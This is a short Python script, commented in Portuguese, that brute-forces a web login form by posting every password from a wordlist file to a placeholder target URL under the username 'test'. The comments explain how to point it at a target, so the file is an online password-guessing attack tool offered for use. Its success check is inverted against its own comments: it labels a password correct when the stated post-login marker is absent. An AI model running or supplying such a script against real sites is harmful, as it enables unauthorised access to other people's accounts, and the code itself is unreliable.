import requests

# Para utilização, certifique-se de que tenha o arquivo "wordlist.txt" no mesmo diretório que o código for utilizado

# Os parâmetros de "data" devem ser os enviados numa request de tentativa de login, por padrão são "username" e "password"

# Coloque o URL Alvo onde está indicando no código, na parte "Mensagem" deve ficar algo que aparecerá na tela, após o login ser bem sucedido, como "Bem Vindo". A melhor alternativa é "Logout"

contagem = 0
with open('wordlist.txt', "r") as file:
    wordlist = file.read().splitlines()
    for word in wordlist:
        data = {"username": "test", "password": word}
        response = requests.post("  URL ALVO  ", data=data)
        if "  Mensagem  " in response.text:
            contagem = contagem + 1
            print("Senha {} incorreta | Tentativa: {}".format(word, contagem))

        else:
            print(f"Senha correta {data} | Tentativa: {contagem}")
